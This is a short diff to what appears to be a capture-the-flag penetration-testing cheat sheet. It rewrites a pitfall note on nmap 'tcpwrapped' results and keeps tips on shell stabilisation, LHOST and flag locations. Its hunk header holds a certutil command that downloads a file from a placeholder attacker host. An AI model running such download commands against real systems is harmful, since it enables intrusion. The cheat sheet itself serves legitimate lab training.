@@ -109,7 +109,7 @@ certutil -urlcache -split -f http://<lhost>:<port>/<file> <file>
 
 ## Pitfalls
 
-- `tcpwrapped` ports may open on a slow scan — use `-T2` and avoid aggressive flags.
+- `tcpwrapped` = handshake completed but the service closed before sending a banner (often a wrapper/firewall), not a scan-speed problem. Re-probe a specific port with `-sV --version-intensity 9` or `nc`/manual. Separately, firewall rate-limiting can hide ports at `-T4/-T5`; retry at `-T2`.
 - Unstable shells lose progress; stabilize before running heavy enumeration.
 - LHOST must be the VPN/tunnel interface IP when attacking CTF platform boxes — verify with `ip a`.
 - User flag is `user.txt` (often in `/home/<user>/`); root flag is `root.txt` (usually `/root/`).
